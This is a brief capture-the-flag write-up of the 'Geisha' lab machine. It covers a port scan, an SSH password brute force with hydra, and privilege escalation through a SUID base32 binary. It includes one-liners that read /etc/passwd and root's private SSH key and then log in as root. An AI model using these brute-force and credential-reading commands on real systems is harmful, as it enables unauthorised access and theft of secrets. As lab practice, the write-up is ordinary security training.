# Geisha

![[Pasted image 20220520204313.png]]

```
192.168.1.133
```

## Port scan

```bash
21/tcp   open  ftp      syn-ack ttl 64 vsftpd 3.0.3
22/tcp   open  ssh      syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http     syn-ack ttl 64 Apache httpd 2.4.38 ((Debian))
3389/tcp open  http     syn-ack ttl 64 nginx 1.14.2
7080/tcp open  ssl/http syn-ack ttl 64 LiteSpeed httpd
7125/tcp open  http     syn-ack ttl 63 nginx 1.17.10
8088/tcp open  http     syn-ack ttl 64 LiteSpeed httpd
9198/tcp open  http     syn-ack ttl 64 SimpleHTTPServer 0.6 (Python 2.7.16)
```

Dirbuster found a `passwd` file at 

```url
http://192.168.1.133:7125/passwd
```

Was able to brute force the `Geisha` user with hydra

```bash
hydra -l geisha -P /usr/share/wordlists/rockyou.txt 192.168.1.133 ssh 
```

![[Pasted image 20220527214936.png]]

linpeas.sh foudn that base32 has the SUID bit set

![[Pasted image 20220527215712.png]]


```bash
LFILE=/etc/passwd && base32 "$LFILE" | base32 --decode
```

![[Pasted image 20220527215755.png]]

I fired up john and started to work on cracking the hash. It was taking a while so I starting thinking of other ways into root.

Maybe there's an ssh key?

```bash
LFILE=/root/.ssh/id_rsa && base32 "$LFILE" | base32 --decode
```

sure enough!
![[Pasted image 20220527221516.png]]

I created the `id_rsa` file by copying the content and then set valid permissions on the file

```bash
chdmod 600
```

```bash
ssh -i id_rsa root@localhost
```


I am ROOT!

![[Pasted image 20220527221713.png]]